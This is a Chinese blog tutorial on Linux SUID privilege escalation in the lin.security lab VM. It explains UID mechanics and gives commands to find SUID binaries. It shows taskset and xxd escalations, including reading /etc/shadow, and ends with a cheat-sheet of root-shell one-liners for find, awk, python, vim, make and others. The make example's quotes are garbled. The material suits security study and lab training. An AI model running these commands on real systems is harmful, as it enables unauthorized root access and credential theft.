---
title: "Linux提权之suid提权"
date: 2023-06-27T16:47:35+08:00
draft: false
categories:
- 内网安全
tags:
- 提权
---

环境：靶场[insecurity](https://in.security/downloads/lin.security_v1.0.ova)
# 什么是suid
SUID是赋予文件的一种特殊权限，具有这种特殊权限的文件会在其执行时，使调用者暂时获得该文件属主的权限。如果某些现有的二进制文件和实用程序具有SUID权限的话，就可以在执行时将权限提升为root。
SUID提权的原理与Linux进程的UID有关，进程在运行的时候有以下三个UID：
```
（A）Real UID：执行该进程的用户的UID。Real UID只用于标识用户，不用于权限检查。
（B）Effective UID（EUID）：进程执行时生效的UID。在对访问目标进行操作时，系统会检查EUID是否有权限。一般情况下，Real UID与EUID相同，但在运行设置了SUID权限的程序时，进程的EUID会被设置为程序文件属主的UID。
（C）Saved UID：在高权限用户降权后，保留的UID。
```
如果某个设置了SUID权限的程序运行后创建了shell，那么shell进程的EUID也会是这个程序文件属主的UID，如果属主为root，便是一个root shell。root shell中运行的程序的EUID也都是0，具备超级权限，于是便实现了提权。
使用`chmod  u+s  [文件]`命令为文件配置SUID权限。
# 提权操作
suid提权其实就是查找具有特定suid权限的参数，再利用其参数进行提权命令调用。suid提权仅对可执行二进制文件有效。
查看本机用有suid权限的文件：
```
find / -user root -perm -4000 -print 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {} \;
find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
```
![](https://s2.loli.net/2022/10/14/zIuHJPSRo1kTWie.png)
- taskset

  执行命令` taskset 1 /bin/bash -p`，成功获取到root权限，提权成功
  ![](https://s2.loli.net/2022/10/14/Z1TGsXDz6lm4Sn2.png)

- xxd
  
  ![](https://s2.loli.net/2022/10/14/ERVxY5msIcX8bS3.png)
  
- 发现itservices组具有执行权限，查看所属组用户：`cat /etc/group | grep itservices`
  
  ![](https://s2.loli.net/2022/10/14/zhU9coCD1iOm4fB.png)
  
  存在用户susan，使用上一篇发现的susan密码登录
  
  ![](https://s2.loli.net/2022/10/14/KbApkFh8VO31fu5.png)
  
  susan无法访问shadow文件，说明权限不够，使用xxd提权访问shadow文件：`xxd "/etc/shadow" | xxd -r`
  
  ![](https://s2.loli.net/2022/10/14/yRYsT4ka65cXHdo.png)
  
- 其他
  常用的suid提权有`nmap`、`vim`、`find`、`bash`、`more`、`less`、`nano`和`cp`等，但这些在靶场不具备环境
  - find:`find . -exec /bin/sh -p \; -quit` 
  - bash:`bash -p`
  - awk:`awk 'BEGIN {system("/bin/bash")}'`
  - ruby:`exec "/bin/bash";`
  - python:`python -c 'import os; os.execl("/bin/sh","sh","-p")'`
  - cp:`sh -c 'cp $(which cp) .; chmod +s ./cp'`
  - chmod:`sh -c 'cp $(which chmod) .; chmod +s ./chmod'`
  - flock:`flock -u / /bin/sh -p`
  - vim:
    ```
    vim.tiny
    # Press ESC key
    :set shell=/bin/sh
    :shell
    ```
  - less:
    ```
    less /etc/passwd
    !/bin/sh
    ```
  - man:
    ```
    man passwd
    !/bin/bash
    ```
  - make
    ```
    COMMAND=’/bin/sh -p’
    make -s –eval=$’x:\n\t-‘”$COMMAND”
    ```
   # 参考文章
   
   http://blog.nsfocus.net/linux/
   
   http://t.zoukankan.com/tomyyyyy-p-14659298.html